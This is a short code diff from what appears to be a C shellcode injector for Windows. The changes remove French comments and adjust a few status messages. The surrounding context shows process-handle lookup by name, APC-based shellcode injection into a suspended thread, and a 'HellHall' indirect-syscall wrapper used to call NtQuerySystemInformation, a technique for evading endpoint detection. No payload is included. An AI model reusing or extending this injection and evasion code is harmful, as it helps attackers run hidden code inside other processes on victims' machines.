@@ -73,7 +73,6 @@ BOOL Initialize() {
 	return TRUE;
 }
 
-// Fonction qui tente d'obtenir le handle du processus en fonction de son nom
 HANDLE GiveMeMyProcessHandle(WCHAR* ProcessName, OUT int* PID) {
 	int pPID = 0;
 	ULONG sProcInfoL = 0;
@@ -296,7 +295,6 @@ BOOL InjectShellcodeAPCmanually(HANDLE hProcess, PVOID pBaseSection) {
 
 	printf("[+] Suspended thread created with TID: %lu\n", threadId);
 
-	// Queue ton shellcode sur ce thread
 	if (QueueUserAPC((PAPCFUNC)pBaseSection, hThread, NULL) == 0) {
 		printf("[!] Failed to queue APC\n");
 		CloseHandle(hThread);
@@ -305,7 +303,6 @@ BOOL InjectShellcodeAPCmanually(HANDLE hProcess, PVOID pBaseSection) {
 
 	printf("[+] APC queued successfully on thread %lu\n", threadId);
 
-	// Maintenant que l'APC est queué, on relance le thread
 	if (ResumeThread(hThread) == (DWORD)-1) {
 		printf("[!] Failed to resume thread\n");
 		CloseHandle(hThread);
@@ -314,7 +311,6 @@ BOOL InjectShellcodeAPCmanually(HANDLE hProcess, PVOID pBaseSection) {
 
 	printf("[+] Thread resumed, shellcode should execute now.\n");
 
-	// Ferme le handle localement, l'exécution est déjà partie
 	CloseHandle(hThread);
 	return TRUE;
 }
@@ -333,7 +329,7 @@ int main() {
 		return -1;
 	}
 	else {
-		printf("Nice finding NTDLL\n");
+		printf("[+] found NTDLL\n");
 	}
 
 	if (!Initialize()) {
@@ -361,7 +357,7 @@ int main() {
 		return -1;
 	}
 
-	// Query system information again
+	// Query system info again
 	if ((STATUS = HellHall(SystemProcessInformation, sProcInfo, sProcInfoL, NULL)) != 0x0) {
 		printf("[!] NtQuerySystemInformation failed with status : 0x%0.8X\n", STATUS);
 		free(sProcInfo);
